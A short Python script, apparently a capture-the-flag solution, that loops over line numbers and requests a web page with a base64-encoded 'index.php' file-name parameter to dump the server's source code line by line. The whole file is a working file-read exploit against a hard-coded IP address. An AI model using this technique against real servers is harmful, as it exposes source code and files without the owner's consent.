import requests
a = 40 #
for i in range(a):
	url = "http://123.206.87.240:8002/web11/index.php?line=%d&filename=aW5kZXgucGhw" %i
	r = requests.get(url)
	print (r.text)
